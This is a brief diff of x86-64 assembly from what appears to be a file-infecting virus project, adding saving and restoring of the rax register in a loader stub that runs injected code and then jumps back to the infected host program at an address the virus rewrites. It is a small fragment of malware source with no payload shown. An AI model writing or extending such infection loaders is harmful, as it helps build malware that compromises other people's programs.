@@ -11,6 +11,7 @@ extern virus
 ;                                    (all but rax, rsp, rbp)
 loader_entry:
 	pushfq                     ; backup flags
+	push rax                   ; backup rax
 	push rcx                   ; backup rcx
 	push rdx                   ; backup rdx
 	push rbx                   ; backup rbx
@@ -99,6 +100,7 @@ return_to_client:
 	pop rbx                    ; restore rbx
 	pop rdx                    ; restore rdx
 	pop rcx                    ; restore rcx
+	pop rax                    ; restore rax
 	popfq                      ; restore flags
 jump_back_to_client:
 	jmp 0xffffffff             ; address rewritten by virus
